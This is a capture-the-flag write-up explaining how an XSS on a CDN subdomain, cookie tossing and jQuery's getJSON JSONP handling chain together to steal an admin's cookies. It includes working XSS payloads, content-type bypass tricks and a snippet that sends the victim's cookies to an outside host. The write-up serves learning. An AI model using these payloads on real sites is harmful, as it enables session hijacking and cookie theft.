## Owner:

> CaptainFreak

#### Solved?

 -No


#### Challenge Description.

0. Three domains:
	0.a. static.volga-ctf.ru -> CDN
	0.b. api.volga-ctf.ru    -> API
	0.c. volga-ctf.ru        -> Main Domain

1. There was a Report Feature to submit a URL and Admin user will visit it using a FireFox client.

2. Standard, Login and Signup.

3. Upon Loggin in, Server sets a standard session cookie "PHPSESSIONID" and another interesting cookie "api-server=api".

4. This `api-server` cookie is used POST-login to send XHR calls to {api-server-cookie}.volga-ctf.ru for getting user Profile [Name, Bio and Profile Picture]. Getting value of subdomain from cookie smells fishy!

5. api.volga-ctf.ru/user-update take an image as well its content-type from client Side but to be not vulnerable to xss it was checking if this contained substrings as "html", "xml" and "xsl".

6. volga.ctf/profile.html?guid=user-id seems useless cause /profile is also doing same

And task was:

> To somehow steal admins cookies by chaining all this.


#### Tried:

1. Clearly SSRF through Report.
2. Fuzzed, Bypassed Got the XSS on static domain through content-type: `image/svg+x\rml` -> this worked because the code `aws/aws-sdk-php`  that pushed the images to s3 bucket (static.volga-ctf.ru) was vulnerable to CRLF. 
Another ways to get XSS on this domain will be :

	2.a. To fuzz multiple content types supported by browser and are interpreted as HTML. Ex. `text/rdf`, `text/xsl` and `text/vtt`

	2.b. Use FirFoxes multipart response rendering with content-type: `Content-Type: multipart/x-mixed-replace;boundary="boundry`. Firefox renders the last part of the response.

#### Solutions:

1.	So we have XSS on static.volga-ctf.ru.

2.  Now using this XSS we can set the cookie `api-server=shoebpatel.com\xff; path=/profile.html` for `volga-ctf.ru`. This will overwrite the original cookie on url `/profile.html` because it was set for "path=/".

3. We did this because now on `volga-ctf.ru/profile.html` the main.js has code

```
$.getJSON(`//${api}.volga-ctf.ru/user?guid=${guid}`
```

loaded will do request on `shoebpatel.com/?volga-ctf.ru/user?guid=${guid}` which will give cookies which was being originally sent to api.volga-ctf.ru (PHPSESSIONID) Only. We have PHP cookie but we yet dont have Flag cookie :( .

4. So this was a ust google search for `$.getJSON XSS` step! We needed to read and find about XSS ways in getJSON !

5. It was damn easy, If the URL to $.getJSON contains `?` anywhere in the following format, Examples:
	
	5.0. https://captainfreak.com/q?a=?
	5.a. https://captainfreak.com/??
	5.b. https://captainfreak.com/=?&
	5.c. https://captainfreak.com??
	5.d. https://??.captainfreak.com/

It will be considered as JSONP in JQuery's context and by that what it means its basically gonna do 

```
<script src="https://captainfreak.com/?a=?"></script>
```

And this is hostes on volga-ctf.ru. Boom XSS.

If you still need to try yourself to get this:

### PoC:

test.html:
```
<!doctype html>
<html lang="en">
  <head>
  	<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>

  </head>
  <body>
  	<script type="text/javascript">
  		$.getJSON('http://0.0.0.0:8000/a?a=?',function(data){});
  	</script>
  	
  </body>
```

where `http://0.0.0.0:8000/a?a=?` returns just 
```
alert(1); 
```

You will get the alert :) 

### Final Simple XSS Exploit to be uploaded to static domain and reported for SSRF:

```
<script> 
document.cookie="api_server=shoebpatel.com\xff; path=/profile.html; domain=.volgactf-task.ru";

// Now we set the server to attacker domain with cookie which will be used for fetching our next XSS cookie exfil payload in below request:

location="https://volgactf-task.ru/profile.html?guid=?"

// This will invoke the $getJSON thingy in main.js with attacker domain responding with second XSS payload :) to send away the cookies on volga-ctf.ru
</script>

// The request to our attacker server (shoebpatel.com/?volgactf-task.ru/user?guid=?) should host the cookie exfiltration payload like:

const url = "shoebpatel.com/?cookie+" + btoa(document.cookie);
document.location = url;

```

### References:

1. https://ctftime.org/task/10863



